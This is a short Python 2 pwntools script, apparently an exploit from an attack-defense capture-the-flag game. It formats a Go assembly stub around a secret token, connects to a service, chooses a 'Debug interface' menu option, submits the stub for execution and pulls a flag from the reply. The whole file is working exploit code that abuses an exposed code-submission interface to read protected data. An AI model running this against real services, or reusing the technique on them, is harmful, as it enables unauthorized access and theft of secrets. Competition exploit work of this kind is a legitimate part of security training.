#!/usr/bin/env python
# -*- coding: utf-8 -*
import re

from pwn import *

CUSTOM_STUB ="""TEXT ·custom(SB), 0, $256-8
    MOVQ SP, BX
    ANDQ $~15, SP
    SUBQ $32, SP
    MOVQ $%s, 0(SP)
    MOVQ $%s, 4(SP)
    MOVQ $%s, 8(SP)
    MOVQ $%s, 12(SP)
    MOVQ $%s, 16(SP)
    MOVQ $%d, DI
    MOVQ SP, SI
    MOVQ $20, DX
    CALL get_detonation_code(SB)
    MOVQ BX, SP
    MOVQ AX, ret+8(FP)
    RET
"""

def get_flag(ip, port, flag_id, token):
    # Create the stub that gets the flag through the debug interface
    payload = CUSTOM_STUB % (hex(unpack(token[:4])), hex(unpack(token[4:8])),
                             hex(unpack(token[8:12])), hex(unpack(token[12:16])),
                             hex(unpack(token[16:])),
                             flag_id)

    p = remote(ip, port)
    # retrieve the flag
    p.recvuntil("4 - Debug interface", timeout=2)
    p.sendline("4")
    p.recvuntil("Submit stub", timeout=2)
    p.send(payload + "EOF\n")

    response = p.recvuntil("DONE!", timeout=2)
    p.close()
    # If we don't get the success message then error
    if "Totes malotes dawg" not in response:
        return False
    # extract the flag from response
    flag = re.search(r"FLG(\w){10}", response).group(0)
    return {"FLAG" : flag}

if __name__ == "__main__":
    print get_flag("127.0.0.1", 6666, 88334260, "3ilSkn0JcSbqaXyO7jkX")
